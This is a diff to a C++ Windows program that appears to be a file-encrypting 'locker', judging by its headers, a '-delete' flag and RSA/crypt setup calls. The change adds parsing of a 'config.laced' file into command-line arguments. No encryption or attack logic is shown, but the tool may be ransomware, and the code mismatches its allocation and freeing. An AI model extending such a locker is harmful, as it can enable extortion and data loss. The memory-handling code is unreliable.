@@ -15,7 +15,9 @@
 #include "filesystem.h"
 #include "locker.h"
 #include "threadpool.h"
+
 #include <string>
+#include "vector"
 
 #define min(a,b) (((a) < (b)) ? (a) : (b))
 
@@ -85,12 +87,23 @@ WCHAR* GetCommandLineArgCurr(int argc, WCHAR** argv, const WCHAR* argv_name)
 
 
 VOID CommandLineHelper();
-VOID ParsingCommandLine(char** argv)
+VOID ParsingCommandLine(int argc_, char** argv, WCHAR** wargv_)
 {
-    int argc;
-    LPWSTR cmd = GetCommandLineW();
-    WCHAR** wargv = CommandLineToArgvW(cmd, &argc);
-
+    int argc;    
+    WCHAR** wargv = NULL;
+    LPWSTR cmd = NULL;
+    if (wargv_)
+    {
+        wargv = wargv_;
+        argc = argc_;
+    }
+    else
+    {
+        cmd = GetCommandLineW();
+        wargv = CommandLineToArgvW(cmd, &argc);
+    }
+    
+    
     if (!wargv || argc <= 1) CommandLineHelper();
 
     WCHAR* helper = GetCommandLineArg(argc, wargv, L"-h");
@@ -309,14 +322,182 @@ VOID ParsingCommandLine(char** argv)
     if (!FileFlagDelete) FileFlagDelete = GetCommandLineArgCurr(argc, wargv, L"-delete");
     if (FileFlagDelete) global::SetFlagDelete(TRUE);
 
-    RtlSecureZeroMemory(cmd, sizeof(cmd));
+    if(cmd)
+        RtlSecureZeroMemory(cmd, sizeof(cmd));
     RtlSecureZeroMemory(argv, sizeof(argv));
 }
 
+
+STATIC BOOL ParseFileConfig(std::vector<CHAR*>* strings, std::vector<WCHAR*>* stringsW)
+{
+    WCHAR* locale = (WCHAR*)memory::m_malloc(MAX_PATH * sizeof(WCHAR));
+    GetCurrentDirectoryW(MAX_PATH, locale);
+    wmemcpy_s(&locale[memory::StrLen(locale)], 13, L"\\config.laced", 13);
+    printf_s("locale:\t%ls\n", locale);
+    
+    HANDLE hFile = CreateFileW(locale, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        printf_s("Failed open config.laced file.\n");
+        memory::m_free(locale);
+        return FALSE;
+    }
+
+    CHAR* FileBuffer = NULL;
+    LARGE_INTEGER FileSize;
+
+    if (!GetFileSizeEx(hFile, &FileSize))
+    {
+        printf_s("The config must be not empty.\n");
+        memory::m_free(locale);        
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    
+    DWORD dwRead;
+    FileBuffer = (CHAR*)memory::m_malloc(FileSize.QuadPart);
+    VOID* ptrbuff = FileBuffer;
+    
+    if (!ReadFile(hFile, FileBuffer, FileSize.QuadPart, &dwRead, NULL))
+    {
+        printf_s("Failed read config.\n");
+        memory::m_free(locale);
+        memory::m_free(ptrbuff);
+        CloseHandle(hFile);
+        return FALSE;
+    }
+
+    
+    std::vector<size_t> indexes;
+    CHAR* ptr = NULL;    
+    CHAR* buff = NULL;
+    CHAR* buff_ = NULL;
+    WCHAR* buff_w = NULL;
+    WCHAR* buff_w_ = NULL;
+    INT j = 0;
+    BOOL mark = FALSE;
+
+    do
+    {
+        ptr = (CHAR*)memory::FindChar(FileBuffer, '\n');
+        if (!ptr) break;
+        size_t index = memory::FindCharI(FileBuffer, '\n');        
+        if (FileBuffer[0] == '*' || FileBuffer[0] == '{' || FileBuffer[0] == '}' || FileBuffer[0] == '\r')
+        {            
+            FileBuffer += index;
+            continue;
+        }
+        CHAR* line = (CHAR*)memory::m_malloc(index + 1);
+        memcpy_s(line, index, FileBuffer, index);
+        if (line[index - 1] == '\r') line[index - 1] = 0;
+        for (INT i = 0; i < index; ++i) 
+        {
+            if (line[i] == '"') 
+            {
+                mark = !mark;
+                if (!mark) 
+                {
+                    indexes.push_back(i - j);       // begin
+                    indexes.push_back(j);           // count smb
+                    j = 0;
+                }
+            }
+            else if (mark) 
+                ++j;
+        }
+        
+        if (!indexes.empty() && indexes.size() == 4)
+        {
+            buff = (CHAR*)memory::m_malloc(indexes[3] + 1);
+            buff_w = (WCHAR*)memory::m_malloc((indexes[3] + 1) * sizeof(WCHAR));
+            memcpy_s(buff, indexes[3], &line[indexes[2]], indexes[3]);
+            MultiByteToWideChar(CP_UTF8, 0, &line[indexes[2]], indexes[3], buff_w, indexes[3]);
+            if (!memory::StrStrC(buff, "false"))
+            {
+                buff_ = (CHAR*)memory::m_malloc(indexes[1] + 1);
+                buff_w_ = (WCHAR*)memory::m_malloc((indexes[1] + 1) * sizeof(WCHAR));
+                memcpy_s(buff_, indexes[1], &line[indexes[0]], indexes[1]);
+                MultiByteToWideChar(CP_UTF8, 0, &line[indexes[0]], indexes[1], buff_w_, indexes[1]);
+                strings->push_back(buff_);
+                stringsW->push_back(buff_w_);
+                if (!memory::StrStrC(buff, "true"))
+                {
+                    strings->push_back(buff);
+                    stringsW->push_back(buff_w);
+                }
+                else
+                {
+                    memory::m_free(buff);
+                    memory::m_free(buff_w);
+                }
+            }
+            else
+            {
+                memory::m_free(buff);
+                memory::m_free(buff_w);
+            }
+        }
+        else
+        {            
+            printf_s("Syntax error: unmatched quotes detected in line: %s\n", line);
+            memory::m_free(locale);
+            memory::m_free(ptrbuff);
+            CloseHandle(hFile);
+            return FALSE;
+        }
+
+        indexes.clear();
+        FileBuffer += index;
+        memory::m_free(line);
+    } while (ptr);
+     
+    memory::m_free(locale);
+    memory::m_free(ptrbuff);
+    CloseHandle(hFile);
+        
+    return TRUE;
+}
+
+STATIC VOID free_vector(std::vector<CHAR*>* strings, std::vector<WCHAR*>* stringsW)
+{
+    for (CHAR* ptr : *strings)
+        delete[] ptr;
+    for (WCHAR* ptr : *stringsW)
+        delete[] ptr;
+
+    delete strings;
+    delete stringsW;
+}
+
+
 int main(int argc, char** argv)
 {
-    ParsingCommandLine(argv);
+    CHAR* pars = GetCommandLineArgChCurr(argc, argv, "config");
+    if (pars)
+    {        
+        std::vector<CHAR*>* strings = new std::vector<CHAR*>;
+        std::vector<WCHAR*>* stringsW = new std::vector<WCHAR*>;
+        if (!ParseFileConfig(strings, stringsW))
+        {
+            printf_s("Failed Parse Config.\n");
+            free_vector(strings, stringsW);
+            return EXIT_FAILURE;
+        }
+        
+        printf("\nconfig.laced parameters:\n");        
+        for(WCHAR* ptr : *stringsW)
+            printf_s("\t%ls\n", ptr);        
+        
+        ParsingCommandLine(strings->size(), strings->data(), stringsW->data());
+        
+        RtlSecureZeroMemory(argv, sizeof(argv));
 
+        free_vector(strings, stringsW);        
+    }
+    else
+        ParsingCommandLine(argc, argv, NULL);
+
+    
     if (global::GetCryptName() || global::GetRsaBase64())
     {
         if (!LoadCrypt32())
